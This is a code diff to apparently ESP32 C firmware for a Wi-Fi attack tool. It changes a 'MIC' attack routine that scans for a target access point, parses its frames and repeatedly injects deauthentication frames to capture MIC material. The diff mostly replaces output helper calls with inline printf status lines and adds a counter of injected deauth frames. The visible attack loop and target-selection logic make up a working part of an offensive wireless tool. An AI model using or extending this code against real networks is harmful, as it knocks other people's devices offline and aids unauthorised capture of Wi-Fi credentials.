@@ -10,7 +10,6 @@
 #include <string.h>
 
 #include "arma_deauth.h"
-#include "arma_output.h"
 #include "arma_utils.h"
 #include "esp_err.h"
 #include "esp_event.h"
@@ -46,7 +45,9 @@ void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
 
   if (notification_data->atk_context == MIC_BASED) {
     arma_mic_finishing_sequence();
-    output_success_mic_attack(u_target_bssid);
+    uint8_t *b = u_target_bssid;
+    printf("{MIC,SUCCESS,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2], b[3],
+           b[4], b[5]);
   }
 }
 
@@ -73,7 +74,7 @@ void arma_mic_delete_task_deauth_inject() {
 }
 
 void arma_mic_finishing_sequence() {
-  output_mic_finishing_sequence();
+  printf("{MIC,FINISHING_SEQUENCE,}\n");
   frame_parser_unregister_data_frame_handler();
   frame_parser_clear_target_parameter();
   arma_mic_notif_event_unregister();
@@ -85,22 +86,25 @@ void arma_mic_inject_deauth() {
   printf(
       "arma_mic.arma_mic_inject_deauth > Task arma_mic_inject_deauth was "
       "created\n");
-  output_mic_operation_started(u_target_bssid);
+  uint8_t *b = u_target_bssid;
+  printf("{MIC,DEAUTH_STARTED,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
+         b[3], b[4], b[5]);
   int current_time = 0;
+  int injected_deauth = 0;
 
   while (1) {
     vTaskDelay(1000 / portTICK_PERIOD_MS);
     if (current_time % 3 == 0) {
-      printf("arma_mic.arma_mic_inject_deauth > Injecting deauth\n");
       arma_deauth_inject();
+      printf("{MIC,INJECTED_DEAUTH,%d,}\n", injected_deauth);
+      injected_deauth++;
     }
-    output_mic_deauth_status(current_time);
     current_time++;
   }
 }
 
 void arma_mic_launching_sequence(uint8_t channel) {
-  output_deauth_launching_sequence();
+  printf("{MIC,LAUNCHING_SEQUENCE,}\n");
   frame_parser_set_target_parameter(u_target_bssid, PARSE_MIC);
   frame_parser_register_data_frame_handler();
   arma_mic_notif_event_register();
@@ -121,19 +125,23 @@ void arma_mic(char *target_bssid) {
   ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
   wifi_ap_record_t *ap_records = ap_list->ap_record_list;
   uint16_t total_scanned_aps = ap_list->count;
-  output_number_of_aps(total_scanned_aps);
+  printf("{MIC,FOUND_APS,%u,}\n", total_scanned_aps);
 
   uint8_t found_target_ap = 0;
   uint8_t index_of_target_ap = 0;
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
-    output_ap_info(&ap_record);
+    uint8_t *bssid = ap_record.bssid;
+    printf("{MIC,SCAN,%02X%02X%02X%02X%02X%02X,%s,%02X,%02X,}\n", bssid[0],
+           bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], ap_record.ssid,
+           (uint8_t)ap_record.rssi, (uint8_t)ap_record.primary);
 
     if (memcmp(ap_record.bssid, u_target_bssid, 6) == 0) {
       found_target_ap = 1;
       index_of_target_ap = i;
     }
   }
+  printf("{MIC,FINISH_SCAN,}\n");
 
   if (found_target_ap == 1) {
     wifi_ap_record_t ap_record = ap_records[index_of_target_ap];
@@ -142,6 +150,8 @@ void arma_mic(char *target_bssid) {
     printf("arma_mic.arma_mic > Target AP channel: %u\n", channel);
     arma_mic_launching_sequence(channel);
   } else if (found_target_ap == 0) {
-    output_failed_mic_attack(u_target_bssid);
+    uint8_t *b = u_target_bssid;
+    printf("{MIC,AP_NOT_FOUND,%02X%02X%02X%02X%02X%02X,}\n", b[0], b[1], b[2],
+           b[3], b[4], b[5]);
   }
 }
